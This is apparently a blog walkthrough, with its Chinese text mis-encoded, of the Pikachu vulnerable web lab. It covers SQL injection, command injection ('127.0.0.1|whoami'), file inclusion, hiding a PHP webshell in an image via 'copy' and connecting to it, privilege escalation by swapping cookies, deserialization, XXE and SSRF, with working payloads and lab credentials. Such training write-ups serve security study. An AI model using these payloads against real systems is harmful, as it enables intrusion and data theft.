<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ä¾‹</span><br><span class="line">kobeâ€™ and sleep(5)#</span><br><span class="line">kobe&#39; and if ((substr(database(),1,1))&#x3D;&#39;a&#39;,sleep&#x3D;(5),null)#</span><br><span class="line">1mså°±è¿”å›ç»“æœ è¯´æ˜ä¸æ˜¯ &quot;a&quot;ä¸€ç›´çˆ†ç ´åˆ°ç¡®å®šæ•°æ®åº“çš„å…¨ç§°</span><br></pre></td></tr></table></figure>

<p>æ³¨å…¥ä¹‹å‰å¯ä»¥å…ˆæµ‹è¯•<code>kobeâ€™ and sleep(5)#</code>è‹¥ç¡®å®æ˜¯5sä¹‹åé¡µé¢åˆ·æ–°åˆ™å­˜åœ¨æ—¶é—´ç›²æ³¨</p>
<h2 id="å®½å­—èŠ‚æ³¨å…¥"><a href="#å®½å­—èŠ‚æ³¨å…¥" class="headerlink" title="å®½å­—èŠ‚æ³¨å…¥"></a>å®½å­—èŠ‚æ³¨å…¥</h2><p>æŠ“åŒ…ä¿®æ”¹æ•°æ®</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ä¿®æ”¹nameå€¼ä¸ºkobe%df&#39; or 1&#x3D;1#</span><br></pre></td></tr></table></figure>

<p><img src="https://img.vim-cn.com/e6/846df244abcc61f41fcda33e1097feb2752b00.png"></p>
<p>å¾—åˆ°å›æ˜¾</p>
<p><img src="https://img.vim-cn.com/cb/074c06446545c30e8107f592c961b403bdcbad.png"></p>
<p>è¯´æ˜å­˜åœ¨æ³¨å…¥</p>
<h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><p><a href="http://t0mrvvi1b3t.top/2021/04/29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">å…³äºrce</a></p>
<h2 id="exec-â€œpingâ€"><a href="#exec-â€œpingâ€" class="headerlink" title="exec â€œpingâ€"></a>exec â€œpingâ€</h2><p><img src="https://img.vim-cn.com/2f/e10a700d174e68246d8443bf9c4be7b63fb42d.png"></p>
<p>åˆ©ç”¨ç®¡é“ç¬¦æ‹¼æ¥å‘½ä»¤</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1|whoami</span><br></pre></td></tr></table></figure>

<p>å°±å¯ä»¥è¿”å›ç”µè„‘çš„ç”¨æˆ·å</p>
<h2 id="exec-â€œevalâ€"><a href="#exec-â€œevalâ€" class="headerlink" title="exec â€œevalâ€"></a>exec â€œevalâ€</h2><p><img src="https://img.vim-cn.com/25/f221d66f3518ab84707179f7bfdf293230fb8e.png"></p>
<p><a target="_blank" rel="noopener" href="https://www.php.net/eval">å…³äºevalå‡½æ•°</a></p>
<p>æ‰§è¡Œä»£ç  payloadï¼š<code>phpinfo();</code></p>
<p>å³å¯çœ‹åˆ°phpinfo</p>
<h1 id="File-inclusion-æ–‡ä»¶åŒ…å«"><a href="#File-inclusion-æ–‡ä»¶åŒ…å«" class="headerlink" title="File inclusion( æ–‡ä»¶åŒ…å« )"></a>File inclusion( æ–‡ä»¶åŒ…å« )</h1><p>å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œæ–‡ä»¶åŒ…å«å‡½æ•°ä¸­åŒ…å«çš„ä»£ç æ–‡ä»¶æ˜¯å›ºå®šçš„ï¼Œå› æ­¤ä¹Ÿä¸ä¼šå‡ºç°å®‰å…¨é—®é¢˜ã€‚                        ä½†æ˜¯ï¼Œæœ‰äº›æ—¶å€™ï¼Œæ–‡ä»¶åŒ…å«çš„ä»£ç æ–‡ä»¶è¢«å†™æˆäº†ä¸€ä¸ªå˜é‡ï¼Œä¸”è¿™ä¸ªå˜é‡å¯ä»¥ç”±å‰ç«¯ç”¨æˆ·ä¼ è¿›æ¥ï¼Œè¿™ç§æƒ…å†µä¸‹ï¼Œå¦‚æœæ²¡æœ‰åšè¶³å¤Ÿçš„å®‰å…¨è€ƒè™‘ï¼Œåˆ™å¯èƒ½ä¼šå¼•å‘æ–‡ä»¶åŒ…å«æ¼æ´ã€‚æ”»å‡»è€…ä¼šæŒ‡å®šä¸€ä¸ªâ€œæ„æƒ³ä¸åˆ°â€çš„æ–‡ä»¶è®©åŒ…å«å‡½æ•°å»æ‰§è¡Œï¼Œä»è€Œé€ æˆæ¶æ„æ“ä½œã€‚</p>
<h2 id="File-inclusion-local"><a href="#File-inclusion-local" class="headerlink" title="File inclusion( local )"></a>File inclusion( local )</h2><p>æœ¬åœ°åŒ…å«</p>
<p>éšä¾¿é€‰æ‹©ä¸€ä¸ª</p>
<p><img src="https://img.vim-cn.com/8a/eb86b177acced6faa3b3d14f7ccf91e0815916.png"></p>
<p>è§‚å¯Ÿurl</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;pikachu&#x2F;vul&#x2F;fileinclude&#x2F;fi_local.php?filename&#x3D;file1.php&amp;submit&#x3D;æäº¤æŸ¥è¯¢</span><br></pre></td></tr></table></figure>

<p>åœ¨æœ¬åœ°æ–‡ä»¶å¤¹å†™å†™ä¸€ä¸ª1.txtæ–‡æœ¬</p>
<p><img src="https://img.vim-cn.com/a4/dfc3100b6040eba1e2fbf2ad914076a094f1a5.png"></p>
<p>ä¿®æ”¹url</p>
<p><img src="https://img.vim-cn.com/35/ffdad9528c963cca07f828a16704aa51afa791.png"></p>
<p>æˆåŠŸåŒ…å«</p>
<p>æºç ğŸ‘‡</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$html</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;submit&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]!=<span class="literal">null</span>)&#123;</span><br><span class="line">    <span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;include/<span class="subst">$filename</span>&quot;</span>;<span class="comment">//å˜é‡ä¼ è¿›æ¥ç›´æ¥åŒ…å«,æ²¡åšä»»ä½•çš„å®‰å…¨é™åˆ¶</span></span><br><span class="line"><span class="comment">//     //å®‰å…¨çš„å†™æ³•,ä½¿ç”¨ç™½åå•ï¼Œä¸¥æ ¼æŒ‡å®šåŒ…å«çš„æ–‡ä»¶å</span></span><br><span class="line"><span class="comment">//     if($filename==&#x27;file1.php&#x27; || $filename==&#x27;file2.php&#x27; || $filename==&#x27;file3.php&#x27; || $filename==&#x27;file4.php&#x27; || $filename==&#x27;file5.php&#x27;)&#123;</span></span><br><span class="line"><span class="comment">//         include &quot;include/$filename&quot;;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//     &#125;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="File-inclusion-remote"><a href="#File-inclusion-remote" class="headerlink" title="File inclusion( remote )"></a>File inclusion( remote )</h2><p><img src="https://img.vim-cn.com/ef/2b63aa1cb083610b4a05bf84c85021c7e979cf.png"></p>
<p>æ‰¾åˆ°æœ¬æœºçš„php.iniä¿®æ”¹é…ç½®æ–‡ä»¶</p>
<p><img src="https://img.vim-cn.com/1a/9453be568c4b11e4d04f2f942105bb16d03067.png"></p>
<p>åˆ©ç”¨kaliåšè¿œç¨‹ä¸»æœºï¼Œåœ¨/var/www/htmlæ–‡ä»¶å¤¹å†…å†™å…¥1.php</p>
<p><img src="https://img.vim-cn.com/5b/f089c4d6ee18432e87161990dab433cbe10007.png"></p>
<p>å¼€å¯apacheæœåŠ¡</p>
<p><img src="https://img.vim-cn.com/66/fb8e9954c00922faad0ae9df4ffe0a79be1c14.png"></p>
<p>ä¿®æ”¹filenameçš„å€¼ä¸º<a target="_blank" rel="noopener" href="http://ip/%E6%96%87%E4%BB%B6%E5%90%8D%E5%8D%B3%E5%8F%AF">http://ip/æ–‡ä»¶åå³å¯</a></p>
<h1 id="Unsafe-filedownload"><a href="#Unsafe-filedownload" class="headerlink" title="Unsafe filedownload"></a>Unsafe filedownload</h1><p>ç‚¹å‡»ä¸‹è½½ï¼Œç”¨bpæŠ“åŒ…ä¿®æ”¹æ•°æ®</p>
<p><img src="https://img.vim-cn.com/09/0e319baa1d8be2cb753b55efbe769b1043f777.png"></p>
<p>ä¿®æ”¹åå³å¯ä¸‹è½½</p>
<p><img src="https://img.vim-cn.com/76/fbba66d802377861c21a1b600adb1a423c0c1d.png"></p>
<h1 id="Unsafe-fileupload"><a href="#Unsafe-fileupload" class="headerlink" title="Unsafe fileupload"></a>Unsafe fileupload</h1><h2 id="client-check"><a href="#client-check" class="headerlink" title="client check"></a>client check</h2><p><img src="https://img.vim-cn.com/2f/c24c1abbd398499ecb192f00724d6d3da000f3.png"></p>
<p>ç›´æ¥ä¸Šä¼ ä¸æˆåŠŸï¼Œæ ¹æ®åç§°çŒœæµ‹æ˜¯å‰ç«¯é™åˆ¶ï¼Œç¦ç”¨å‰ç«¯js</p>
<p><img src="https://img.vim-cn.com/38/17aa302884396e7447d6e9d8608c3587ec22c3.png"></p>
<p>å†æ¬¡å°è¯•ä¸Šä¼ </p>
<p><img src="https://img.vim-cn.com/a3/81bbb500bb969b2afda3f422e52b3f02e40bbf.png"></p>
<p>ä¸Šä¼ æˆåŠŸ</p>
<p><img src="https://img.vim-cn.com/46/ed7136a521540a4689ede9361b66d547983d02.png"></p>
<h2 id="Mime-type"><a href="#Mime-type" class="headerlink" title="Mime type"></a>Mime type</h2><p>æŠ“åŒ…ä¿®æ”¹æ–‡ä»¶ç±»å‹å³å¯</p>
<p><img src="https://img.vim-cn.com/56/ef276966936cb8da8ed5b4210f4432e57398bf.png"></p>
<p>æ”¾åŒ…</p>
<p><img src="https://img.vim-cn.com/04/e3cf0031666248e109f0d271a65d01d0e9ae87.png"></p>
<h2 id="getimagesize"><a href="#getimagesize" class="headerlink" title="getimagesize"></a>getimagesize</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/andr01la/p/5146422.html">å…³äºcopy</a></p>
<p>å¯åˆ©ç”¨windowsç³»ç»Ÿå‘½ä»¤ <code>copy</code> å°†ä¸€æ®µphpæ’å…¥åˆ°å›¾ç‰‡é‡Œè¾¹</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">copy 2.jpg&#x2F;b+ma.php&#x2F;a 3.jpg</span><br><span class="line"></span><br><span class="line">æŠŠma.php æ’å…¥åˆ° 2.jpgä¸­ è¦†ç›–3.jpg</span><br></pre></td></tr></table></figure>

<p>ä¹‹åä¸Šä¼ å›¾åƒæ–‡ä»¶</p>
<p> å› ä¸ºæ‰“å¼€ä¹‹åæ˜¯ä¸ªå›¾ç‰‡ï¼Œæ— æ³•ç›´æ¥åˆ©ç”¨ï¼Œé€šè¿‡æ–‡ä»¶åŒ…å«çš„æƒ³æ³•æ¥getshell</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url:http:&#x2F;&#x2F;127.0.0.1&#x2F;pikachu-master&#x2F;vul&#x2F;fileinclude&#x2F;fi_local.php?filename&#x3D;..&#x2F;..&#x2F;unsafeupload&#x2F;+ç»™å‡ºçš„å›¾ç‰‡è·¯å¾„&amp;submit&#x3D;%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2</span><br></pre></td></tr></table></figure>

<p>é€šè¿‡èšå‰‘è¿›è¡Œè¿æ¥å³å¯</p>
<h1 id="Over-Permission"><a href="#Over-Permission" class="headerlink" title="Over Permission"></a>Over Permission</h1><p>ä¸€èˆ¬è¶Šæƒæ¼æ´å®¹æ˜“å‡ºç°åœ¨æƒé™é¡µé¢ï¼ˆéœ€è¦ç™»å½•çš„é¡µé¢ï¼‰å¢ã€åˆ ã€æ”¹ã€æŸ¥çš„çš„åœ°æ–¹ï¼Œå½“ç”¨æˆ·å¯¹æƒé™é¡µé¢å†…çš„ä¿¡æ¯è¿›è¡Œè¿™äº›æ“ä½œæ—¶ï¼Œåå°éœ€è¦å¯¹å½“å‰ç”¨æˆ·çš„æƒé™è¿›è¡Œæ ¡éªŒï¼Œçœ‹å…¶æ˜¯å¦å…·å¤‡æ“ä½œçš„æƒé™ï¼Œä»è€Œç»™å‡ºå“åº”ï¼Œè€Œå¦‚æœæ ¡éªŒçš„è§„åˆ™è¿‡äºç®€å•åˆ™å®¹æ˜“å‡ºç°è¶Šæƒæ¼æ´</p>
<h2 id="æ°´å¹³è¶Šæƒ"><a href="#æ°´å¹³è¶Šæƒ" class="headerlink" title="æ°´å¹³è¶Šæƒ"></a>æ°´å¹³è¶Šæƒ</h2><p>æ°´å¹³è¶Šæƒ ä»¥ä¸€ä¸ªç”¨æˆ·æ¥è¶Šæƒæ“ä½œå¦ä¸€ä¸ªç”¨æˆ·çš„æ•°æ®</p>
<p>å³ä¸Šè§’æç¤ºç»™äº†3ä¸ªè´¦å·</p>
<p>ä»¥kobeè´¦å·æ°´å¹³è¶Šæƒliliä¸ºä¾‹</p>
<p><img src="https://img.vim-cn.com/ad/a4c0edb59a49ae0129c52e18c9ad242a2de082.png"></p>
<p>ç›´æ¥ä¿®æ”¹ä¸€ä¸‹usernameçš„å€¼å‘ç°è¿”å›liliçš„ä¿¡æ¯</p>
<h2 id="å‚ç›´è¶Šæƒ"><a href="#å‚ç›´è¶Šæƒ" class="headerlink" title="å‚ç›´è¶Šæƒ"></a>å‚ç›´è¶Šæƒ</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tipsï¼šè¿™é‡Œæœ‰ä¸¤ä¸ªç”¨æˆ·admin&#x2F;123456,pikachu&#x2F;000000,adminæ˜¯è¶…çº§boss</span><br></pre></td></tr></table></figure>

<p>é‚£å°±æ˜¯ç”¨pikachuæ¥è¶Šæƒadminäº†</p>
<p>å…ˆç™»å½•pikachuè´¦å·ï¼Œå‘ç°åªæœ‰æŸ¥çœ‹æƒé™</p>
<p><img src="https://img.vim-cn.com/41/0edfe03e10a2708faf7916cbe5f04740f124a0.png"></p>
<p>ç™»é™†adminè´¦å·ï¼Œå‘ç°æœ‰æ·»åŠ ç”¨æˆ·çš„æƒé™ï¼Œæ·»åŠ ä¸€ä¸ªç”¨æˆ·å¹¶æŠ“åŒ…å‘é€è‡³repeateræ¨¡å—</p>
<p>é€€å‡ºadminï¼Œç™»é™†pikachuï¼Œå†æ¬¡æŠ“åŒ…è·å–pikachuçš„cookie</p>
<p>ç™»é™†åå‘ç°äº†åˆšåˆšæ·»åŠ çš„hhhç”¨æˆ·</p>
<p><img src="https://img.vim-cn.com/fa/c52643ea0720586e2673fc70c10f46132d8cc9.png"></p>
<p>è¿™æ—¶è½¬åˆ°bpï¼Œç”¨åˆšåˆšå¤åˆ¶çš„pikachuçš„cookieæ¥æ›¿æ¢adminçš„cookieï¼Œå¹¶ä¿®æ”¹ä¸€ä¸‹ç”¨æˆ·ä¿¡æ¯ï¼Œç‚¹å‡»send</p>
<p>åˆ·æ–°ç•Œé¢å°±å¯ä»¥çœ‹åˆ°æ–°å¢çš„ç”¨æˆ·abcäº†</p>
<p><img src="https://img.vim-cn.com/99/a93fc7fe0b0674f73e2c477b8ab50422eac81c.png"></p>
<h1 id="ç›®å½•éå†"><a href="#ç›®å½•éå†" class="headerlink" title="../../( ç›®å½•éå† )"></a>../../( ç›®å½•éå† )</h1><p><img src="https://img.vim-cn.com/fa/5caf8b25132971c3641b8b470c5b71a60828f9.png"></p>
<p>è§‚å¯Ÿæ¦‚è¿°çš„url</p>
<p><img src="https://img.vim-cn.com/92/381e4d9f45d213954b5ceb553edc33ea2e93f6.png"></p>
<p>ç‚¹å‡»1 å¯ä»¥çœ‹åˆ°å¯¹åº”çš„url</p>
<p>æŠŠtitleçš„å€¼ä¿®æ”¹ä¸º<code>../dir.php</code>å³å¯è½¬åˆ°æ¦‚è¿°ç•Œé¢</p>
<h1 id="æ•æ„Ÿä¿¡æ¯æ³„éœ²"><a href="#æ•æ„Ÿä¿¡æ¯æ³„éœ²" class="headerlink" title="æ•æ„Ÿä¿¡æ¯æ³„éœ²"></a>æ•æ„Ÿä¿¡æ¯æ³„éœ²</h1><p>â€”é€šè¿‡è®¿é—®urlä¸‹çš„ç›®å½•ï¼Œå¯ä»¥ç›´æ¥åˆ—å‡ºç›®å½•ä¸‹çš„æ–‡ä»¶åˆ—è¡¨;<br>â€”è¾“å…¥é”™è¯¯çš„urlå‚æ•°åæŠ¥é”™ä¿¡æ¯é‡Œé¢åŒ…å«æ“ä½œç³»ç»Ÿã€ä¸­é—´ä»¶ã€å¼€å‘è¯­è¨€çš„ç‰ˆæœ¬æˆ–å…¶ä»–ä¿¡æ¯;<br>â€”å‰ç«¯çš„æºç ï¼ˆhtml,css,jsï¼‰é‡Œé¢åŒ…å«äº†æ•æ„Ÿä¿¡æ¯ï¼Œæ¯”å¦‚åå°ç™»å½•åœ°å€ã€å†…ç½‘æ¥å£ä¿¡æ¯ã€ç”šè‡³è´¦å·å¯†ç ç­‰;</p>
<h2 id="icanseeyourABC"><a href="#icanseeyourABC" class="headerlink" title="icanseeyourABC"></a>icanseeyourABC</h2><p>å…ˆæŸ¥çœ‹æºä»£ç ï¼Œå‘ç°é‡Œä¸€ä¸ªæ³¨é‡Š</p>
<p><img src="https://img.vim-cn.com/de/f83af66764569764b89669949e237f189a84fc.png"></p>
<h1 id="PHPååºåˆ—åŒ–"><a href="#PHPååºåˆ—åŒ–" class="headerlink" title="PHPååºåˆ—åŒ–"></a>PHPååºåˆ—åŒ–</h1><p><strong>åºåˆ—åŒ–serialize()</strong><br>åºåˆ—åŒ–è¯´é€šä¿—ç‚¹å°±æ˜¯æŠŠä¸€ä¸ªå¯¹è±¡å˜æˆå¯ä»¥ä¼ è¾“çš„å­—ç¬¦ä¸²,æ¯”å¦‚ä¸‹é¢æ˜¯ä¸€ä¸ªå¯¹è±¡:            </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span>=<span class="string">&quot;pikachu&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$s</span>=<span class="keyword">new</span> S(); <span class="comment">//åˆ›å»ºä¸€ä¸ªå¯¹è±¡</span></span><br><span class="line">serialize(<span class="variable">$s</span>); <span class="comment">//æŠŠè¿™ä¸ªå¯¹è±¡è¿›è¡Œåºåˆ—åŒ–</span></span><br><span class="line">åºåˆ—åŒ–åå¾—åˆ°çš„ç»“æœæ˜¯è¿™ä¸ªæ ·å­çš„:O:<span class="number">1</span>:<span class="string">&quot;S&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;pikachu&quot;</span>;&#125;</span><br><span class="line">    O:ä»£è¡¨<span class="keyword">object</span></span><br><span class="line">    <span class="number">1</span>:ä»£è¡¨å¯¹è±¡åå­—é•¿åº¦ä¸ºä¸€ä¸ªå­—ç¬¦</span><br><span class="line">    S:å¯¹è±¡çš„åç§°</span><br><span class="line">    <span class="number">1</span>:ä»£è¡¨å¯¹è±¡é‡Œé¢æœ‰ä¸€ä¸ªå˜é‡</span><br><span class="line">    s:æ•°æ®ç±»å‹</span><br><span class="line">    <span class="number">4</span>:å˜é‡åç§°çš„é•¿åº¦</span><br><span class="line">    test:å˜é‡åç§°</span><br><span class="line">    s:æ•°æ®ç±»å‹</span><br><span class="line">    <span class="number">7</span>:å˜é‡å€¼çš„é•¿åº¦</span><br><span class="line">    pikachu:å˜é‡å€¼</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>ååºåˆ—åŒ–unserialize()</strong></p>
<p>å°±æ˜¯æŠŠè¢«åºåˆ—åŒ–çš„å­—ç¬¦ä¸²è¿˜åŸä¸ºå¯¹è±¡,ç„¶ååœ¨æ¥ä¸‹æ¥çš„ä»£ç ä¸­ç»§ç»­ä½¿ç”¨ã€‚</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$u</span>=unserialize(<span class="string">&quot;O:1:&quot;</span>S<span class="string">&quot;:1:&#123;s:4:&quot;</span>test<span class="string">&quot;;s:7:&quot;</span>pikachu<span class="string">&quot;;&#125;&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$u</span>-&gt;test; <span class="comment">//å¾—åˆ°çš„ç»“æœä¸ºpikachu</span></span><br></pre></td></tr></table></figure>

<p>åºåˆ—åŒ–å’Œååºåˆ—åŒ–æœ¬èº«æ²¡æœ‰é—®é¢˜,ä½†æ˜¯å¦‚æœååºåˆ—åŒ–çš„å†…å®¹æ˜¯ç”¨æˆ·å¯ä»¥æ§åˆ¶çš„,ä¸”åå°ä¸æ­£å½“çš„ä½¿ç”¨äº†PHPä¸­çš„é­”æ³•å‡½æ•°,å°±ä¼šå¯¼è‡´å®‰å…¨é—®é¢˜</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">å¸¸è§çš„å‡ ä¸ªé­”æ³•å‡½æ•°:</span><br><span class="line">__construct()å½“ä¸€ä¸ªå¯¹è±¡åˆ›å»ºæ—¶è¢«è°ƒç”¨</span><br><span class="line"></span><br><span class="line">__destruct()å½“ä¸€ä¸ªå¯¹è±¡é”€æ¯æ—¶è¢«è°ƒç”¨</span><br><span class="line"></span><br><span class="line">__toString()å½“ä¸€ä¸ªå¯¹è±¡è¢«å½“ä½œä¸€ä¸ªå­—ç¬¦ä¸²ä½¿ç”¨</span><br><span class="line"></span><br><span class="line">__sleep() åœ¨å¯¹è±¡åœ¨è¢«åºåˆ—åŒ–ä¹‹å‰è¿è¡Œ</span><br><span class="line"></span><br><span class="line">__wakeupå°†åœ¨åºåˆ—åŒ–ä¹‹åç«‹å³è¢«è°ƒç”¨</span><br><span class="line"></span><br><span class="line">æ¼æ´ä¸¾ä¾‹:</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$test</span> = <span class="string">&quot;pikachu&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$s</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line">@<span class="variable">$unser</span> = unserialize(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line">payload:O:<span class="number">1</span>:<span class="string">&quot;S&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>;s:<span class="number">29</span>:<span class="string">&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>payloadï¼š<code>O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:29:&quot;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&quot;;&#125;</code></p>
<h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><p><code>xmlå¤–éƒ¨å®ä½“æ³¨å…¥æ¼æ´</code></p>
<p>å°±æ˜¯â€æ”»å‡»è€…é€šè¿‡å‘æœåŠ¡å™¨æ³¨å…¥æŒ‡å®šçš„xmlå®ä½“å†…å®¹,ä»è€Œè®©æœåŠ¡å™¨æŒ‰ç…§æŒ‡å®šçš„é…ç½®è¿›è¡Œæ‰§è¡Œ,å¯¼è‡´é—®é¢˜â€ä¹Ÿå°±æ˜¯è¯´æœåŠ¡ç«¯æ¥æ”¶å’Œè§£æäº†æ¥è‡ªç”¨æˆ·ç«¯çš„xmlæ•°æ®,è€Œåˆæ²¡æœ‰åšä¸¥æ ¼çš„å®‰å…¨æ§åˆ¶,ä»è€Œå¯¼è‡´xmlå¤–éƒ¨å®ä½“æ³¨å…¥ã€‚</p>
<p>tipsï¼šå…ˆæŠŠXMLå£°æ˜ã€DTDæ–‡æ¡£ç±»å‹å®šä¹‰ã€æ–‡æ¡£å…ƒç´ è¿™äº›åŸºç¡€çŸ¥è¯†è‡ªå·±çœ‹ä¸€ä¸‹</p>
<p><code>payloadï¼š&lt;?xml version = &quot;1.0&quot;?&gt; &lt;!DOCTYPE note [ &lt;!ENTITY hacker &quot;xxe&quot;&gt; ]&gt; &lt;name&gt;&amp;hacker;&lt;/name&gt;</code></p>
<p><img src="https://img.vim-cn.com/c3/635e0fe9aa8b0a38b868251ad57841094e1702.png"></p>
<h1 id="URLé‡å®šå‘"><a href="#URLé‡å®šå‘" class="headerlink" title="URLé‡å®šå‘"></a>URLé‡å®šå‘</h1><p>æœ‰4ä¸ªè¶…é“¾æ¥</p>
<p><img src="https://img.vim-cn.com/8c/b149c61e557813a7bc2e5e40911f219538b917.png"></p>
<p>å¯ä»¥ä¿®æ”¹ç¬¬ä¸‰ä¸ªå’Œç¬¬å››ä¸ªçš„urlçš„å€¼ï¼ˆä¿®æ”¹ä¸ºæŸä¸ªç½‘å€çš„urlï¼‰æ¥å®ç°ç½‘é¡µè·³è½¬</p>
<h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><p><strong>SSRF(Server-Side Request Forgery:æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ )</strong></p>
<p>å…¶å½¢æˆçš„åŸå› å¤§éƒ½æ˜¯ç”±äºæœåŠ¡ç«¯<strong>æä¾›äº†ä»å…¶ä»–æœåŠ¡å™¨åº”ç”¨è·å–æ•°æ®çš„åŠŸèƒ½</strong>,ä½†åˆæ²¡æœ‰å¯¹ç›®æ ‡åœ°å€åšä¸¥æ ¼è¿‡æ»¤ä¸é™åˆ¶</p>
<p>â€‹            å¯¼è‡´æ”»å‡»è€…å¯ä»¥ä¼ å…¥ä»»æ„çš„åœ°å€æ¥è®©åç«¯æœåŠ¡å™¨å¯¹å…¶å‘èµ·è¯·æ±‚,å¹¶è¿”å›å¯¹è¯¥ç›®æ ‡åœ°å€è¯·æ±‚çš„æ•°æ®</p>
<p>â€‹            æ•°æ®æµ:æ”»å‡»è€…â€”â€“&gt;æœåŠ¡å™¨â€”-&gt;ç›®æ ‡åœ°å€</p>
<p>â€‹            æ ¹æ®åå°ä½¿ç”¨çš„å‡½æ•°çš„ä¸åŒ,å¯¹åº”çš„å½±å“å’Œåˆ©ç”¨æ–¹æ³•åˆæœ‰ä¸ä¸€æ ·            </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PHPä¸­ä¸‹é¢å‡½æ•°çš„ä½¿ç”¨ä¸å½“ä¼šå¯¼è‡´SSRF:</span><br><span class="line">file_get_contents()</span><br><span class="line">fsockopen()</span><br><span class="line">curl_exec()</span><br></pre></td></tr></table></figure>

<h2 id="SSRF-curl"><a href="#SSRF-curl" class="headerlink" title="SSRF( curl )"></a>SSRF( curl )</h2><p><img src="https://img.vim-cn.com/d7/5eac2b9f9c8051751e22667ed1545c31a552e7.png"></p>
<p>ç‚¹å‡»é“¾æ¥</p>
<p><img src="https://img.vim-cn.com/11/00492eb830ce580aca87eb342c41a5267c28cb.png"></p>
<p>ä¿®æ”¹ä¸€ä¸‹urlå³å¯å®ç°è·³è½¬ï¼ˆæ”¹ä¸ºç™¾åº¦çš„åœ°å€</p>
<p><img src="https://img.vim-cn.com/95/d6600cb6eeaf58998dd8dc77194adcc7281ff3.png"></p>
<p>successï¼</p>
